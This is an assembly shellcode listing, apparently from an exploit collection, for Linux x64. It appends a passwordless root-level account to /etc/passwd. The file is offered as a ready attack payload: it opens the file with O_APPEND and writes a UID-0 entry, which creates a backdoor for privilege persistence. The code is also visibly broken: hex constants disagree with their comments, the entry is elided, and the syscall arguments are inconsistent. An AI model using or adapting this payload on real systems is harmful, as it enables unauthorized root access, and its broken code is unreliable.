; Title:    Linux x64 add root user via /etc/passwd write
; Platform: linux
; Arch:     x64
; Size:     ~80 bytes
; Encoding: raw
;
; Assembled hex:
; ; see assembled hex after nasm assembly

BITS 64
global _start

_start:
    ; open("/etc/passwd", O_WRONLY|O_APPEND, 0)
    xor     rax, rax
    push    rax
    mov     rdi, 0x6477737361702f2f  ; "//passwd"
    push    rdi
    mov     rdi, 0x6374652f2f2f2f  ; "////etc/"
    push    rdi
    mov     rdi, rsp
    push    0x401                ; O_WRONLY|O_APPEND
    pop     rsi
    xor     rdx, rdx
    mov     al, 0x2              ; open
    syscall
    ; write line: "r00t::0:0:root:/root:/bin/bash
"
    push    0xa                  ; newline
    mov     rbx, 0x687361622f6e69  ; "/bin/bas"
    push    rbx
    mov     rbx, 0x622f3a746f6f  ; "root:/"
    push    rbx
    ; ... build full passwd entry
    mov     rdi, rax             ; fd
    mov     rsi, rsp
    mov     rdx, 30
    mov     rax, 0x1             ; write
    syscall
    ; close(fd)
    mov     al, 0x3
    syscall
